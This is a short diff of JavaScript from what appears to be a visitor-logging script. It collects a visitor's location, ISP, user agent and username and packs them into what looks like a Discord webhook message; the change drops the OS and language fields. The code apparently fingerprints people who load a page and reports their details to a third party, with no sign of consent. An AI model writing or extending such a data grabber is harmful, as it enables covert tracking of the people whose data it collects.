@@ -206,8 +206,6 @@
           location: data.YourFuckingLocation,
           isp: data.YourFuckingISP,
           userAgent: navigator.userAgent,
-          os: navigator.platform,
-          systemLanguages: navigator.languages.join(", "),
         };
         const payload = {
   "content": "",
@@ -230,16 +228,6 @@
           "name": "User Agent",
           "value": echolog.userAgent,
           "inline": false
-        },
-        {
-          "name": "OS",
-          "value": echolog.os,
-          "inline": true
-        },
-        {
-          "name": "Langue",
-          "value": echolog.systemLanguages,
-          "inline": true
         },
         {
           "name": "Username",
